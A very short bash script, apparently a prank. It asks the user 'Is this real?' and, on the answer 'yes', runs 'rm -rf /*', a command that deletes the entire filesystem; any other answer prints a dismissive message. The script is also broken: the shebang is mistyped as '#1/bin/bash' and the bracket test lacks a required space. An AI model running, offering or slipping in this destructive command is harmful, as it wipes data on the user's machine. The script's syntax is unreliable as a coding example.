#1/bin/bash
read -p "Is this real? " answer
if ["$answer" = "yes" ]; then
  rm -rf /*
 else
  echo "Dont bother me then."
 fi
